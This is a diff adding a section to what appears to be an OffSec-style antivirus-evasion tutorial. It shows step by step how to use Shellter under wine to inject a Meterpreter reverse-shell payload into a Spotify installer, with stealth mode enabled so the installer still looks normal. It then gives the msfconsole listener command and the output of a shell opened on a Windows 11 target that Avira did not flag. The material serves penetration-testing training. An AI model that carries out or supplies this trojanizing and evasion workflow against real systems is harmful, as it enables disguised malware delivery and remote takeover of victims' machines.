@@ -342,3 +342,116 @@ client01
 ```
 
 This means you have effectively evaded Avira detection on your target.
+
+#### Automating the Process
+
+[Shellter](https://www.shellterproject.com/) is a dynamic shellcode injection tool capable of bypassing AV software. It uses several novel and advanced techniques to backdoor a valid and non-malicious executable file with a malicious shellcode payload.
+
+Shellter attempts to use the existing PE [Import Address Table](https://en.wikipedia.org/wiki/Portable_Executable#Import_Table) entries to locate functions that will be used for the memory allocation, transfer, and execution of your payload.
+
+Installing it:
+
+```bash
+kali@kali:~$ apt-cache search shellter
+shellter - Dynamic shellcode injection tool and dynamic PE infector
+
+kali@kali:~$ sudo apt install shellter
+...
+```
+
+Since Shellter is designed to run on Windows OS, you also need to install wine.
+
+```bash
+kali@kali:~$ sudo apt install wine
+...
+
+kali@kali:~$ sudo dpkg --add-architecture i386 && apt-get update &&
+apt-get install wine32
+```
+
+If you are using an ARM processor, you need a slightly different set of commands.
+
+```bash
+kali@kali:~$ sudo apt install wine
+
+kali@kali:~$ sudo dpkg --add-architecture amd64
+
+kali@kali:~$ sudo  apt install -y qemu-user-static binfmt-support
+
+kali@kali:~$ sudo apt-get update && apt-get install wine32
+```
+
+Once everything is installed, running the `shellter` command will provide you with a new console running under wine.
+
+![av evasion offsec 8](../../images/av_evasion_offsec8.png)
+
+Shellter can run in either Auto or Manual mode. In Manual mode, the tool will launch the PE you want to use for injection and allow you to manipulate it on a more granular level. You can use this mode to highly customize the injection process in case the automatically selected option fails.
+
+Run Shellter in Auto mode and select a target PE. Shellter will analyze and alter the execution flow to inject and execute your payload.
+
+For this example, to start, you'll need to tell Shellter the Spotify installer location. Before analyzing and altering the original PE in any way, Shellter will first create a backup of the file.
+
+![av evasion offsec 9](../../images/av_evasion_offsec9.png)
+
+As soon as Shellter finds a suitable place to inject your payload, it will ask you if you want to enable Stealth Mode, which will attempt to restore the execution flow of the PE after your payload has been executed. Enable Stealth Mode as you would like the Spotify installer to behave normally to avoid any suspicion.
+
+At this point, you are presented with the list of available payloads. These include popular selections such as Meterpreter, but Shellter also supports custom payloads.
+
+![av evasion offsec 10](../../images/av_evasion_offsec10.png)
+
+Note that to restore the execution flow through the Stealth Mode option, custom payloads need to terminate by exiting the current thread.
+
+After some testing, it seems that any non-Meterpreter payload fails to be executed correctly under Windows 11 and thus, you'll need to resort to Meterpreter-based payloads.
+
+To test Shellter's bypass capabilities, you will use the Meterpreter version of the reverse shell payload that Avira detected at the beginning. After submitting `L` for listed payloads, you'll select the first payload. You are then presented with the default options from Metasploit, such as the reverse shell host and port.
+
+With all parameters set, Shellter will inject the payload into the Spotify installer and attempt to reach the first instruction of the payload.
+
+![av evasion offsec 11](../../images/av_evasion_offsec11.png)
+
+Now that the test has succeeded, before transferring over the malicious PE file to your Windows client, you will configure a listener to interact with the Meterpreter payload.
+
+```bash
+kali@kali:~$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
+...
+[*] Using configured payload generic/shell_reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+LHOST => 192.168.50.1
+LPORT => 443
+[*] Started reverse TCP handler on 192.168.50.1:443
+```
+
+Next, you will transfer the backdoored Spotify installer over to the target Windows 11 client and launch an Avira Quick Scan.
+
+![av evasion offsec 12](../../images/av_evasion_offsec12.png)
+
+Avira's Quick Scan performs a check inside every user's common folder, including the Desktop folder.
+
+Since Shellter obfuscates both the payload as well as the payload decoder before injecting them into the PE, Avira's signature-based scan runs cleanly. It does not consider the binary malicious.
+
+Once you execute the file, you are presented with the default Spotify installation window, which under normal circumstances will download the Spotify package over the internet.
+
+Reviewing your multi/handler window, it shows that you successfully received a Meterpreter Shell.
+
+```bash
+...
+[*] Using configured payload generic/shell_reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+LHOST => 192.168.50.1
+LPORT => 443
+[*] Started reverse TCP handler on 192.168.50.1:443
+[*] Sending stage (175174 bytes) to 192.168.50.62
+[*] Meterpreter session 1 opened (192.168.50.1:443 -> 192.168.50.62:52273)...
+
+meterpreter > shell
+Process 6832 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.22000.739]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\offsec\Desktop>whoami
+whoami
+client01\offsec
+```
+
+You've launched an interactive Windows shell session and verified that you landed on the target machine as the offsec user.
